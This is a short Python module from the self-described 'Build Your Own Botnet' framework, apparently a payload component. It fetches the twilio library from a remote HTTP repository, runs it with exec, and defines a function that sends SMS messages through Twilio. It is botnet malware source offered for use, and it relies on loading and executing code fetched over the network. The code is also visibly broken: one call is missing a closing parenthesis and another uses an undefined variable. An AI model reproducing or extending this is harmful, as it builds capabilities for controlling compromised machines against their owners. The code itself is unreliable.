#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library

import httpimport

# byob

import util

# remote imports

with httpimport.remote_repo(['twilio'], base_url='http://localhost:8000'):
    for module in ['twilio']:
        try:
            exec "import %s" % module
        except ImportError:
            util.debug("Error: unable to import '%s'" % module


                       
def text_message(account_sid, auth_token, phone_number, message):
    try:
        phone_number = '+{}'.format(str().join([i for i in str(phone_number) if str(i).isdigit()]))
        cli = twilio.rest.Client(account_sid, auth_token)
        msg = cli.api.account.messages.create(to=phone_number, from_=phone, body=message)
        return "SUCCESS: text message sent to {}".format(phone_number)
    except Exception as e:
        return "{} error: {}".format(text_message.func_name, str(e))

